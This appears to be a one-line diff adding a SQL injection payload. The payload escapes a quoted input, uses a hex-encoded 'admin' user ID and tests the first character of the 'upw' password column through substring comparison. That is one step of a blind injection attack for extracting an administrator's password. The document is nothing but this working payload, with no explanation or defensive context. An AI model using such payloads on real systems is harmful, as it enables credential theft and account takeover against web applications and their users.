@@ -1,0 +1,1 @@
+```xxx'||uid=0x61646d696e&&substring(upw,1,1)='D```
